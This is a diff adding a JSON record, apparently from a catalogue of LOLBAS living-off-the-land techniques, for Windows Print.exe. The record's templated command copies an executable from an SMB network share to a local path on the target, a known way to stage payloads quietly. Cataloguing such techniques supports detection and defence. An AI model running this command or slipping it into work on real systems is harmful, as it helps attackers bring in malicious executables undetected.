@@ -1,0 +1,23 @@
+{
+  "id": "lolbas-print-exe-copy-2",
+  "name": "LOLBAS · Print.exe (Copy) #2",
+  "command": "print /D:{PATH_ABSOLUTE:.dest.exe} {PATH_SMB:.source.exe}",
+  "description": "Copy File.exe from a network share to the target c:\\OutFolder\\outfile.exe.",
+  "platform": "windows",
+  "tags": [
+    "lolbas",
+    "print",
+    "copy"
+  ],
+  "source": "lolbas",
+  "source_url": "https://lolbas-project.github.io/lolbas/Print/",
+  "upstream_id": "Print.exe/Copy/1",
+  "category": "lolbas",
+  "subcategory": "copy",
+  "references": [
+    {
+      "title": "LOLBAS — Print.exe",
+      "url": "https://lolbas-project.github.io/lolbas/Print/"
+    }
+  ]
+}
